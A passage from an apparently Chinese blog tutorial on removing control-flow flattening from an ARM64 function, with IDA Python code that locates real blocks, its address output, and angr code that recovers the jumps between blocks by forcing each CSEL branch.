如果有子分发器-&gt;回退到 ori_ret_block</span><br><span class="hljs-comment"># 否则就是一开始找到的 ret 块</span><br><br><span class="hljs-comment"># 查找所有真实块</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">find_all_real_blocks</span>(<span class="hljs-params">fun_ea</span>):<br>    blocks = idaapi.FlowChart(idaapi.get_func(fun_ea))<br><br>    <span class="hljs-comment"># 获取循环头</span><br>    loop_heads = find_loop_head(fun_ea)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;循环头数量: <span class="hljs-subst">&#123;<span class="hljs-built_in">len</span>(loop_heads)&#125;</span>----<span class="hljs-subst">&#123;[<span class="hljs-built_in">hex</span>(x) <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> loop_heads]&#125;</span>&quot;</span>)<br>    all_real_blocks = []<br><br>    <span class="hljs-comment">#对每个循环头分析真实块</span><br>    <span class="hljs-keyword">for</span> loop_head_addr <span class="hljs-keyword">in</span> loop_heads:<br>        loop_head_block = get_basic_block(loop_head_addr)<br>        loop_head_preds = <span class="hljs-built_in">list</span>(loop_head_block.preds())<br>        loop_head_preds_addr = [b.start_ea <span class="hljs-keyword">for</span> b <span class="hljs-keyword">in</span> loop_head_preds]<br><br>        converge_addr = find_converge_addr(loop_head_addr)<br>        real_blocks = []<br><br>        <span class="hljs-comment"># 从循环头的前驱里剔除汇聚块，剩下序言块</span><br>        <span class="hljs-keyword">if</span> loop_head_addr != converge_addr:<br>            loop_head_preds_addr.remove(converge_addr)<br>            real_blocks.extend(loop_head_preds_addr)<br><br>        <span class="hljs-comment"># 分析汇聚块前驱，找真实块</span><br>        converge_block = get_basic_block(converge_addr)<br>        list_preds = <span class="hljs-built_in">list</span>(converge_block.preds())<br>        <span class="hljs-keyword">for</span> pred <span class="hljs-keyword">in</span> list_preds:<br>            end_ea = pred.end_ea<br>            last_inst_ea = idc.prev_head(end_ea)<br>            mnem = idc.print_insn_mnem(last_inst_ea)<br><br>            size = get_block_size(pred)<br>            <span class="hljs-keyword">if</span> size &gt; <span class="hljs-number">4</span> <span class="hljs-keyword">and</span> <span class="hljs-string">&quot;B.&quot;</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> mnem: <span class="hljs-comment"># 大于单指令块且不是跳转指令</span><br>                start_ea = pred.start_ea<br>                mnem = idc.print_insn_mnem(start_ea)<br>                <span class="hljs-keyword">if</span> mnem == <span class="hljs-string">&quot;CSEL&quot;</span>: <span class="hljs-comment"># 处理条件选择指令</span><br>                    csel_preds = pred.preds()<br>                    <span class="hljs-keyword">for</span> csel_pred <span class="hljs-keyword">in</span> csel_preds:<br>                        real_blocks.append(csel_pred.start_ea)<br>                <span class="hljs-keyword">else</span>:<br>                    real_blocks.append(start_ea)<br><br>        real_blocks.sort() <span class="hljs-comment"># 排序，第一个是序言块</span><br>        all_real_blocks.append(real_blocks)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;子循环头:&quot;</span>, [<span class="hljs-built_in">hex</span>(child_block_ea) <span class="hljs-keyword">for</span> child_block_ea <span class="hljs-keyword">in</span> real_blocks])<br><br>    <span class="hljs-comment"># 添加返回块</span><br>    ret_addr = find_ret_block(blocks)<br>    all_real_blocks.append(ret_addr)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;all_real_blocks:&quot;</span>,all_real_blocks)<br><br>    <span class="hljs-comment"># 合并所有真实块地址</span><br>    all_real_block_list = []<br>    <span class="hljs-keyword">for</span> real_blocks <span class="hljs-keyword">in</span> all_real_blocks:<br>        <span class="hljs-keyword">if</span> <span class="hljs-built_in">isinstance</span>(real_blocks,<span class="hljs-built_in">list</span>):<br>            all_real_block_list.extend(real_blocks)<br>        <span class="hljs-keyword">else</span>:<br>            all_real_block_list.append(real_blocks)<br><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;\n所有真实块获取完成&quot;</span>)<br>    <span class="hljs-built_in">print</span>(all_real_block_list)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;真实块数量: <span class="hljs-subst">&#123;<span class="hljs-built_in">len</span>(all_real_block_list)&#125;</span>&quot;</span>)<br>    <span class="hljs-built_in">print</span>([<span class="hljs-built_in">hex</span>(x) <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> all_real_block_list],<span class="hljs-string">&quot;\n&quot;</span>)<br><br>    <span class="hljs-comment"># 分析子序言块</span><br>    all_child_prologue_addr = all_real_blocks.copy()<br>    all_child_prologue_addr.remove(ret_addr)<br>    all_child_prologue_addr.remove(all_child_prologue_addr[<span class="hljs-number">0</span>])  <span class="hljs-comment"># 移除主序言块</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;所有子序言块相关的真实块地址:&quot;</span>, all_child_prologue_addr)<br>    <br>    <span class="hljs-comment"># 获取子序言块的最后指令地址</span><br>    all_child_prologue_last_ins_ea = []<br>    <span class="hljs-keyword">for</span> child_prologue_array <span class="hljs-keyword">in</span> all_child_prologue_addr:<br>        child_prologue_addr = child_prologue_array[<span class="hljs-number">0</span>]<br>        child_prologue_block = get_basic_block(child_prologue_addr)<br>        child_prologue_end_ea = child_prologue_block.end_ea<br>        child_prologue_last_ins_ea = idc.prev_head(child_prologue_end_ea)<br>        all_child_prologue_last_ins_ea.append(child_prologue_last_ins_ea)<br>    <br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;所有子序言块的最后一条指令的地址:&quot;</span>, all_child_prologue_last_ins_ea)<br>    <br>    <span class="hljs-keyword">return</span> all_real_blocks, all_child_prologue_addr, all_child_prologue_last_ins_ea<br><br><br>func_ea = <span class="hljs-number">0x41D08</span><br>reals = find_all_real_blocks(func_ea)<br></code></pre></td></tr></table></figure><p>输出：</p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs 1c">循环头数量<span class="hljs-punctuation">:</span> <span class="hljs-number">2</span><span class="hljs-punctuation">-</span><span class="hljs-punctuation">-</span><span class="hljs-punctuation">-</span><span class="hljs-punctuation">-</span>[&#x27;0x41dbc&#x27;<span class="hljs-punctuation">,</span> &#x27;0x<span class="hljs-number">4229</span>0&#x27;]<br>子循环头<span class="hljs-punctuation">:</span> [&#x27;0x41d08&#x27;<span class="hljs-punctuation">,</span> &#x27;0x41da0&#x27;<span class="hljs-punctuation">,</span> &#x27;0x41e14&#x27;<span class="hljs-punctuation">,</span> &#x27;0x41e70&#x27;<span class="hljs-punctuation">,</span> &#x27;0x41f0c&#x27;<span class="hljs-punctuation">,</span> &#x27;0x41f64&#x27;<span class="hljs-punctuation">,</span> &#x27;0x41fac&#x27;<span class="hljs-punctuation">,</span> &#x27;0x<span class="hljs-number">4200</span>c&#x27;<span class="hljs-punctuation">,</span> &#x27;0x<span class="hljs-number">4205</span>8&#x27;<span class="hljs-punctuation">,</span> &#x27;0x420b4&#x27;<span class="hljs-punctuation">,</span> &#x27;0x420fc&#x27;<span class="hljs-punctuation">,</span> &#x27;0x<span class="hljs-number">4212</span>c&#x27;<span class="hljs-punctuation">,</span> &#x27;0x<span class="hljs-number">4213</span>c&#x27;<span class="hljs-punctuation">,</span> &#x27;0x<span class="hljs-number">4215</span>4&#x27;<span class="hljs-punctuation">,</span> &#x27;0x421b0&#x27;<span class="hljs-punctuation">,</span> &#x27;0x421c4&#x27;<span class="hljs-punctuation">,</span> &#x27;0x421d8&#x27;<span class="hljs-punctuation">,</span> &#x27;0x421f0&#x27;<span class="hljs-punctuation">,</span> &#x27;0x<span class="hljs-number">4220</span>8&#x27;<span class="hljs-punctuation">,</span> &#x27;0x<span class="hljs-number">4221</span>c&#x27;<span class="hljs-punctuation">,</span> &#x27;0x<span class="hljs-number">4223</span>c&#x27;<span class="hljs-punctuation">,</span> &#x27;0x42a48&#x27;<span class="hljs-punctuation">,</span> &#x27;0x42a68&#x27;<span class="hljs-punctuation">,</span> &#x27;0x42a80&#x27;<span class="hljs-punctuation">,</span> &#x27;0x42a90&#x27;]<br>子循环头<span class="hljs-punctuation">:</span> [&#x27;0x<span class="hljs-number">4225</span>8&#x27;<span class="hljs-punctuation">,</span> &#x27;0x422f8&#x27;<span class="hljs-punctuation">,</span> &#x27;0x<span class="hljs-number">4236</span>8&#x27;<span class="hljs-punctuation">,</span> &#x27;0x423dc&#x27;<span class="hljs-punctuation">,</span> &#x27;0x<span class="hljs-number">4245</span>4&#x27;<span class="hljs-punctuation">,</span> &#x27;0x424b0&#x27;<span class="hljs-punctuation">,</span> &#x27;0x<span class="hljs-number">4251</span>8&#x27;<span class="hljs-punctuation">,</span> &#x27;0x<span class="hljs-number">4257</span>0&#x27;<span class="hljs-punctuation">,</span> &#x27;0x425b8&#x27;<span class="hljs-punctuation">,</span> &#x27;0x<span class="hljs-number">4262</span>c&#x27;<span class="hljs-punctuation">,</span> &#x27;0x<span class="hljs-number">4266</span>c&#x27;<span class="hljs-punctuation">,</span> &#x27;0x426c8&#x27;<span class="hljs-punctuation">,</span> &#x27;0x<span class="hljs-number">4271</span>8&#x27;<span class="hljs-punctuation">,</span> &#x27;0x<span class="hljs-number">4279</span>4&#x27;<span class="hljs-punctuation">,</span> &#x27;0x427d8&#x27;<span class="hljs-punctuation">,</span> &#x27;0x<span class="hljs-number">4280</span>8&#x27;<span class="hljs-punctuation">,</span> &#x27;0x<span class="hljs-number">4286</span>0&#x27;<span class="hljs-punctuation">,</span> &#x27;0x<span class="hljs-number">4287</span>0&#x27;<span class="hljs-punctuation">,</span> &#x27;0x428a8&#x27;<span class="hljs-punctuation">,</span> &#x27;0x428c0&#x27;<span class="hljs-punctuation">,</span> &#x27;0x428e4&#x27;<span class="hljs-punctuation">,</span> &#x27;0x<span class="hljs-number">4291</span>8&#x27;<span class="hljs-punctuation">,</span> &#x27;0x<span class="hljs-number">4293</span>0&#x27;<span class="hljs-punctuation">,</span> &#x27;0x<span class="hljs-number">4295</span>8&#x27;<span class="hljs-punctuation">,</span> &#x27;0x<span class="hljs-number">4299</span>c&#x27;<span class="hljs-punctuation">,</span> &#x27;0x429bc&#x27;<span class="hljs-punctuation">,</span> &#x27;0x429d8&#x27;<span class="hljs-punctuation">,</span> &#x27;0x429e8&#x27;<span class="hljs-punctuation">,</span> &#x27;0x42a04&#x27;<span class="hljs-punctuation">,</span> &#x27;0x42a1c&#x27;<span class="hljs-punctuation">,</span> &#x27;0x42a2c&#x27;]<br>all_real_blocks<span class="hljs-punctuation">:</span> [[<span class="hljs-number">269576</span><span class="hljs-punctuation">,</span> <span class="hljs-number">269728</span><span class="hljs-punctuation">,</span> <span class="hljs-number">269844</span><span class="hljs-punctuation">,</span> <span class="hljs-number">269936</span><span class="hljs-punctuation">,</span> <span class="hljs-number">270092</span><span class="hljs-punctuation">,</span> <span class="hljs-number">270180</span><span class="hljs-punctuation">,</span> <span class="hljs-number">270252</span><span class="hljs-punctuation">,</span> <span class="hljs-number">270348</span><span class="hljs-punctuation">,</span> <span class="hljs-number">270424</span><span class="hljs-punctuation">,</span> <span class="hljs-number">270516</span><span class="hljs-punctuation">,</span> <span class="hljs-number">270588</span><span class="hljs-punctuation">,</span> <span class="hljs-number">270636</span><span class="hljs-punctuation">,</span> <span class="hljs-number">270652</span><span class="hljs-punctuation">,</span> <span class="hljs-number">270676</span><span class="hljs-punctuation">,</span> <span class="hljs-number">270768</span><span class="hljs-punctuation">,</span> <span class="hljs-number">270788</span><span class="hljs-punctuation">,</span> <span class="hljs-number">270808</span><span class="hljs-punctuation">,</span> <span class="hljs-number">270832</span><span class="hljs-punctuation">,</span> <span class="hljs-number">270856</span><span class="hljs-punctuation">,</span> <span class="hljs-number">270876</span><span class="hljs-punctuation">,</span> <span class="hljs-number">270908</span><span class="hljs-punctuation">,</span> <span class="hljs-number">272968</span><span class="hljs-punctuation">,</span> <span class="hljs-number">273000</span><span class="hljs-punctuation">,</span> <span class="hljs-number">273024</span><span class="hljs-punctuation">,</span> <span class="hljs-number">273040</span>]<span class="hljs-punctuation">,</span> [<span class="hljs-number">270936</span><span class="hljs-punctuation">,</span> <span class="hljs-number">271096</span><span class="hljs-punctuation">,</span> <span class="hljs-number">271208</span><span class="hljs-punctuation">,</span> <span class="hljs-number">271324</span><span class="hljs-punctuation">,</span> <span class="hljs-number">271444</span><span class="hljs-punctuation">,</span> <span class="hljs-number">271536</span><span class="hljs-punctuation">,</span> <span class="hljs-number">271640</span><span class="hljs-punctuation">,</span> <span class="hljs-number">271728</span><span class="hljs-punctuation">,</span> <span class="hljs-number">271800</span><span class="hljs-punctuation">,</span> <span class="hljs-number">271916</span><span class="hljs-punctuation">,</span> <span class="hljs-number">271980</span><span class="hljs-punctuation">,</span> <span class="hljs-number">272072</span><span class="hljs-punctuation">,</span> <span class="hljs-number">272152</span><span class="hljs-punctuation">,</span> <span class="hljs-number">272276</span><span class="hljs-punctuation">,</span> <span class="hljs-number">272344</span><span class="hljs-punctuation">,</span> <span class="hljs-number">272392</span><span class="hljs-punctuation">,</span> <span class="hljs-number">272480</span><span class="hljs-punctuation">,</span> <span class="hljs-number">272496</span><span class="hljs-punctuation">,</span> <span class="hljs-number">272552</span><span class="hljs-punctuation">,</span> <span class="hljs-number">272576</span><span class="hljs-punctuation">,</span> <span class="hljs-number">272612</span><span class="hljs-punctuation">,</span> <span class="hljs-number">272664</span><span class="hljs-punctuation">,</span> <span class="hljs-number">272688</span><span class="hljs-punctuation">,</span> <span class="hljs-number">272728</span><span class="hljs-punctuation">,</span> <span class="hljs-number">272796</span><span class="hljs-punctuation">,</span> <span class="hljs-number">272828</span><span class="hljs-punctuation">,</span> <span class="hljs-number">272856</span><span class="hljs-punctuation">,</span> <span class="hljs-number">272872</span><span class="hljs-punctuation">,</span> <span class="hljs-number">272900</span><span class="hljs-punctuation">,</span> <span class="hljs-number">272924</span><span class="hljs-punctuation">,</span> <span class="hljs-number">272940</span>]<span class="hljs-punctuation">,</span> <span class="hljs-number">273072</span>]<br><br>所有真实块获取完成<br>[<span class="hljs-number">269576</span><span class="hljs-punctuation">,</span> <span class="hljs-number">269728</span><span class="hljs-punctuation">,</span> <span class="hljs-number">269844</span><span class="hljs-punctuation">,</span> <span class="hljs-number">269936</span><span class="hljs-punctuation">,</span> <span class="hljs-number">270092</span><span class="hljs-punctuation">,</span> <span class="hljs-number">270180</span><span class="hljs-punctuation">,</span> <span class="hljs-number">270252</span><span class="hljs-punctuation">,</span> <span class="hljs-number">270348</span><span class="hljs-punctuation">,</span> <span class="hljs-number">270424</span><span class="hljs-punctuation">,</span> <span class="hljs-number">270516</span><span class="hljs-punctuation">,</span> <span class="hljs-number">270588</span><span class="hljs-punctuation">,</span> <span class="hljs-number">270636</span><span class="hljs-punctuation">,</span> <span class="hljs-number">270652</span><span class="hljs-punctuation">,</span> <span class="hljs-number">270676</span><span class="hljs-punctuation">,</span> <span class="hljs-number">270768</span><span class="hljs-punctuation">,</span> <span class="hljs-number">270788</span><span class="hljs-punctuation">,</span> <span class="hljs-number">270808</span><span class="hljs-punctuation">,</span> <span class="hljs-number">270832</span><span class="hljs-punctuation">,</span> <span class="hljs-number">270856</span><span class="hljs-punctuation">,</span> <span class="hljs-number">270876</span><span class="hljs-punctuation">,</span> <span class="hljs-number">270908</span><span class="hljs-punctuation">,</span> <span class="hljs-number">272968</span><span class="hljs-punctuation">,</span> <span class="hljs-number">273000</span><span class="hljs-punctuation">,</span> <span class="hljs-number">273024</span><span class="hljs-punctuation">,</span> <span class="hljs-number">273040</span><span class="hljs-punctuation">,</span> <span class="hljs-number">270936</span><span class="hljs-punctuation">,</span> <span class="hljs-number">271096</span><span class="hljs-punctuation">,</span> <span class="hljs-number">271208</span><span class="hljs-punctuation">,</span> <span class="hljs-number">271324</span><span class="hljs-punctuation">,</span> <span class="hljs-number">271444</span><span class="hljs-punctuation">,</span> <span class="hljs-number">271536</span><span class="hljs-punctuation">,</span> <span class="hljs-number">271640</span><span class="hljs-punctuation">,</span> <span class="hljs-number">271728</span><span class="hljs-punctuation">,</span> <span class="hljs-number">271800</span><span class="hljs-punctuation">,</span> <span class="hljs-number">271916</span><span class="hljs-punctuation">,</span> <span class="hljs-number">271980</span><span class="hljs-punctuation">,</span> <span class="hljs-number">272072</span><span class="hljs-punctuation">,</span> <span class="hljs-number">272152</span><span class="hljs-punctuation">,</span> <span class="hljs-number">272276</span><span class="hljs-punctuation">,</span> <span class="hljs-number">272344</span><span class="hljs-punctuation">,</span> <span class="hljs-number">272392</span><span class="hljs-punctuation">,</span> <span class="hljs-number">272480</span><span class="hljs-punctuation">,</span> <span class="hljs-number">272496</span><span class="hljs-punctuation">,</span> <span class="hljs-number">272552</span><span class="hljs-punctuation">,</span> <span class="hljs-number">272576</span><span class="hljs-punctuation">,</span> <span class="hljs-number">272612</span><span class="hljs-punctuation">,</span> <span class="hljs-number">272664</span><span class="hljs-punctuation">,</span> <span class="hljs-number">272688</span><span class="hljs-punctuation">,</span> <span class="hljs-number">272728</span><span class="hljs-punctuation">,</span> <span class="hljs-number">272796</span><span class="hljs-punctuation">,</span> <span class="hljs-number">272828</span><span class="hljs-punctuation">,</span> <span class="hljs-number">272856</span><span class="hljs-punctuation">,</span> <span class="hljs-number">272872</span><span class="hljs-punctuation">,</span> <span class="hljs-number">272900</span><span class="hljs-punctuation">,</span> <span class="hljs-number">272924</span><span class="hljs-punctuation">,</span> <span class="hljs-number">272940</span><span class="hljs-punctuation">,</span> <span class="hljs-number">273072</span>]<br>真实块数量<span class="hljs-punctuation">:</span> <span class="hljs-number">57</span><br>[&#x27;0x41d08&#x27;<span class="hljs-punctuation">,</span> &#x27;0x41da0&#x27;<span class="hljs-punctuation">,</span> &#x27;0x41e14&#x27;<span class="hljs-punctuation">,</span> &#x27;0x41e70&#x27;<span class="hljs-punctuation">,</span> &#x27;0x41f0c&#x27;<span class="hljs-punctuation">,</span> &#x27;0x41f64&#x27;<span class="hljs-punctuation">,</span> &#x27;0x41fac&#x27;<span class="hljs-punctuation">,</span> &#x27;0x<span class="hljs-number">4200</span>c&#x27;<span class="hljs-punctuation">,</span> &#x27;0x<span class="hljs-number">4205</span>8&#x27;<span class="hljs-punctuation">,</span> &#x27;0x420b4&#x27;<span class="hljs-punctuation">,</span> &#x27;0x420fc&#x27;<span class="hljs-punctuation">,</span> &#x27;0x<span class="hljs-number">4212</span>c&#x27;<span class="hljs-punctuation">,</span> &#x27;0x<span class="hljs-number">4213</span>c&#x27;<span class="hljs-punctuation">,</span> &#x27;0x<span class="hljs-number">4215</span>4&#x27;<span class="hljs-punctuation">,</span> &#x27;0x421b0&#x27;<span class="hljs-punctuation">,</span> &#x27;0x421c4&#x27;<span class="hljs-punctuation">,</span> &#x27;0x421d8&#x27;<span class="hljs-punctuation">,</span> &#x27;0x421f0&#x27;<span class="hljs-punctuation">,</span> &#x27;0x<span class="hljs-number">4220</span>8&#x27;<span class="hljs-punctuation">,</span> &#x27;0x<span class="hljs-number">4221</span>c&#x27;<span class="hljs-punctuation">,</span> &#x27;0x<span class="hljs-number">4223</span>c&#x27;<span class="hljs-punctuation">,</span> &#x27;0x42a48&#x27;<span class="hljs-punctuation">,</span> &#x27;0x42a68&#x27;<span class="hljs-punctuation">,</span> &#x27;0x42a80&#x27;<span class="hljs-punctuation">,</span> &#x27;0x42a90&#x27;<span class="hljs-punctuation">,</span> &#x27;0x<span class="hljs-number">4225</span>8&#x27;<span class="hljs-punctuation">,</span> &#x27;0x422f8&#x27;<span class="hljs-punctuation">,</span> &#x27;0x<span class="hljs-number">4236</span>8&#x27;<span class="hljs-punctuation">,</span> &#x27;0x423dc&#x27;<span class="hljs-punctuation">,</span> &#x27;0x<span class="hljs-number">4245</span>4&#x27;<span class="hljs-punctuation">,</span> &#x27;0x424b0&#x27;<span class="hljs-punctuation">,</span> &#x27;0x<span class="hljs-number">4251</span>8&#x27;<span class="hljs-punctuation">,</span> &#x27;0x<span class="hljs-number">4257</span>0&#x27;<span class="hljs-punctuation">,</span> &#x27;0x425b8&#x27;<span class="hljs-punctuation">,</span> &#x27;0x<span class="hljs-number">4262</span>c&#x27;<span class="hljs-punctuation">,</span> &#x27;0x<span class="hljs-number">4266</span>c&#x27;<span class="hljs-punctuation">,</span> &#x27;0x426c8&#x27;<span class="hljs-punctuation">,</span> &#x27;0x<span class="hljs-number">4271</span>8&#x27;<span class="hljs-punctuation">,</span> &#x27;0x<span class="hljs-number">4279</span>4&#x27;<span class="hljs-punctuation">,</span> &#x27;0x427d8&#x27;<span class="hljs-punctuation">,</span> &#x27;0x<span class="hljs-number">4280</span>8&#x27;<span class="hljs-punctuation">,</span> &#x27;0x<span class="hljs-number">4286</span>0&#x27;<span class="hljs-punctuation">,</span> &#x27;0x<span class="hljs-number">4287</span>0&#x27;<span class="hljs-punctuation">,</span> &#x27;0x428a8&#x27;<span class="hljs-punctuation">,</span> &#x27;0x428c0&#x27;<span class="hljs-punctuation">,</span> &#x27;0x428e4&#x27;<span class="hljs-punctuation">,</span> &#x27;0x<span class="hljs-number">4291</span>8&#x27;<span class="hljs-punctuation">,</span> &#x27;0x<span class="hljs-number">4293</span>0&#x27;<span class="hljs-punctuation">,</span> &#x27;0x<span class="hljs-number">4295</span>8&#x27;<span class="hljs-punctuation">,</span> &#x27;0x<span class="hljs-number">4299</span>c&#x27;<span class="hljs-punctuation">,</span> &#x27;0x429bc&#x27;<span class="hljs-punctuation">,</span> &#x27;0x429d8&#x27;<span class="hljs-punctuation">,</span> &#x27;0x429e8&#x27;<span class="hljs-punctuation">,</span> &#x27;0x42a04&#x27;<span class="hljs-punctuation">,</span> &#x27;0x42a1c&#x27;<span class="hljs-punctuation">,</span> &#x27;0x42a2c&#x27;<span class="hljs-punctuation">,</span> &#x27;0x42ab0&#x27;] <br><br>所有子序言块相关的真实块地址<span class="hljs-punctuation">:</span> [[<span class="hljs-number">270936</span><span class="hljs-punctuation">,</span> <span class="hljs-number">271096</span><span class="hljs-punctuation">,</span> <span class="hljs-number">271208</span><span class="hljs-punctuation">,</span> <span class="hljs-number">271324</span><span class="hljs-punctuation">,</span> <span class="hljs-number">271444</span><span class="hljs-punctuation">,</span> <span class="hljs-number">271536</span><span class="hljs-punctuation">,</span> <span class="hljs-number">271640</span><span class="hljs-punctuation">,</span> <span class="hljs-number">271728</span><span class="hljs-punctuation">,</span> <span class="hljs-number">271800</span><span class="hljs-punctuation">,</span> <span class="hljs-number">271916</span><span class="hljs-punctuation">,</span> <span class="hljs-number">271980</span><span class="hljs-punctuation">,</span> <span class="hljs-number">272072</span><span class="hljs-punctuation">,</span> <span class="hljs-number">272152</span><span class="hljs-punctuation">,</span> <span class="hljs-number">272276</span><span class="hljs-punctuation">,</span> <span class="hljs-number">272344</span><span class="hljs-punctuation">,</span> <span class="hljs-number">272392</span><span class="hljs-punctuation">,</span> <span class="hljs-number">272480</span><span class="hljs-punctuation">,</span> <span class="hljs-number">272496</span><span class="hljs-punctuation">,</span> <span class="hljs-number">272552</span><span class="hljs-punctuation">,</span> <span class="hljs-number">272576</span><span class="hljs-punctuation">,</span> <span class="hljs-number">272612</span><span class="hljs-punctuation">,</span> <span class="hljs-number">272664</span><span class="hljs-punctuation">,</span> <span class="hljs-number">272688</span><span class="hljs-punctuation">,</span> <span class="hljs-number">272728</span><span class="hljs-punctuation">,</span> <span class="hljs-number">272796</span><span class="hljs-punctuation">,</span> <span class="hljs-number">272828</span><span class="hljs-punctuation">,</span> <span class="hljs-number">272856</span><span class="hljs-punctuation">,</span> <span class="hljs-number">272872</span><span class="hljs-punctuation">,</span> <span class="hljs-number">272900</span><span class="hljs-punctuation">,</span> <span class="hljs-number">272924</span><span class="hljs-punctuation">,</span> <span class="hljs-number">272940</span>]]<br>所有子序言块的最后一条指令的地址<span class="hljs-punctuation">:</span> [<span class="hljs-number">270980</span>]<br></code></pre></td></tr></table></figure><h4 id="找到真实块之间的关系"><a href="#找到真实块之间的关系" class="headerlink" title="找到真实块之间的关系"></a>找到真实块之间的关系</h4><p>由上述步骤我们已经找到了所有的真实块，接下来要做的就是找到这些真实块之间的跳转关系<br>这里就使用到了 Angr 来处理，为了避免一次性执行完整个程序发生路径爆炸，导致执行失败的问题，我们采用分块单独执行的方式，每次执行只取 real_blocks 中的一个块，如第一次取 real_blocks[0] 开始执行，当执行到的地址在保存的真实块地址列表中时，就停止执行，保存当前状态，记录下这个块连接关系；然后取下一个真实块 real_blocks[1] 作为新的初始状态继续执行</p><p>几个要点：</p><ul><li>用 proj.hook() hook 序言块的最后一条指令地址，让 angr 直接从真实块地址开始执行</li><li>对于每个真实块，用 angr 的模拟器（simgr）单步执行，如果执行流跳转到的地址在 real_blocks 里就认为这是后继块</li><li>对于符合的普通无条件跳转，直接记录；对于 CSEL 条件跳转，强制选择 CSEL 的某个分支结果，而不用依赖当前状态里的条件标志，分别模拟真&#x2F;假两种情况</li></ul><p>具体实现</p><ul><li>CSEL 指令解析以及它的特殊处理机制<br><code>csel x0, x1, x2, eq</code></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">capstone_decode_csel</span>(<span class="hljs-params">insn</span>):<br>    operands = insn.op_str.replace(<span class="hljs-string">&quot; &quot;</span>, <span class="hljs-string">&quot;&quot;</span>).split(<span class="hljs-string">&quot;,&quot;</span>)<br>    dst_reg = operands[<span class="hljs-number">0</span>] <span class="hljs-comment"># 目标寄存器</span><br>    true_reg = operands[<span class="hljs-number">1</span>] <span class="hljs-comment"># 条件为真时的寄存器</span><br>    false_reg = operands[<span class="hljs-number">2</span>] <span class="hljs-comment"># 条件为假时的寄存器</span><br>    condition = operands[<span class="hljs-number">3</span>] <span class="hljs-comment"># 条件</span><br>    <span class="hljs-keyword">return</span> dst_reg, true_reg, false_reg, condition<br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">find_state_succ</span>(<span class="hljs-params">proj, base, local_state, flag, real_blocks, real_block_addr, path</span>):<br>    <span class="hljs-comment"># 仅在 find_block_succ 识别为 csel 时调用</span><br>    ins = local_state.block().capstone.insns[<span class="hljs-number">0</span>] <span class="hljs-comment"># 获取当前块的第一条指令,假设是 csel</span><br>    dst_reg, true_reg, false_reg, condition = capstone_decode_csel(ins) <br>    val1 = local_state.regs.get(true_reg)<br>    val2 = local_state.regs.get(false_reg)<br><br>    sm = proj.factory.simgr(local_state)<br>    sm.step(num_inst=<span class="hljs-number">1</span>) <span class="hljs-comment"># 单步执行一条指令</span><br>    temp_state = sm.active[<span class="hljs-number">0</span>] <br><br>    <span class="hljs-comment"># 强制选择 CSEL 的某个分支结果（不用依赖当前状态里的条件标志）</span><br>    <span class="hljs-keyword">if</span> flag:<br>        <span class="hljs-built_in">setattr</span>(temp_state.regs, dst_reg, val1) <span class="hljs-comment"># 条件为真，设置目标寄存器为真值</span><br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-built_in">setattr</span>(temp_state.regs, dst_reg, val2)<br><br>    <span class="hljs-keyword">while</span>(<span class="hljs-built_in">len</span>(sm.active)):<br>        <span class="hljs-keyword">for</span> active_state <span class="hljs-keyword">in</span> sm.active:<br>            ins_offset = active_state.addr - base<br>            <span class="hljs-keyword">if</span> ins_offset <span class="hljs-keyword">in</span> real_blocks:<br>                value = path[real_block_addr]<br>                <span class="hljs-keyword">if</span> ins_offset <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> value:<br>                    value.append(ins_offset)<br>                    <span class="hljs-keyword">return</span> ins_offset  <br>        sm.step(num_inst=<span class="hljs-number">1</span>)<br></code></pre></td></tr></table></figure><ul><li>识别真实块的后继<br>从初始化 state 出发，找到进入该 real_block 的 state，然后在该 block 上判定是无条件还是遇到 CSEL 需要分支处理，并把结果写入 path</li></ul><p>主要流程:<br>创建一个主模拟器开始执行，遍历所有 active 状态寻找真实块<br>复制当前状态创建新模拟器用于探索后继块，同时单步执行一次避免状态混淆<br>无条件跳转的情况下，如果有多个路径同时执行到真实块，排除掉 ret 块的路径<br>CSEL 条件跳转的情况下，我们知道 angr 在默认执行时，会依据当前状态的条件标志决定走哪一边，但这里采用半符号执行，不依赖真实标志，所以复制一份当前状态（True 分支），强制设定 csel 结果为真分支，再复制一份（False 分支），强制设定为假分支，然后执行直到遇到属于 real_blocks 的真实块地址</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span 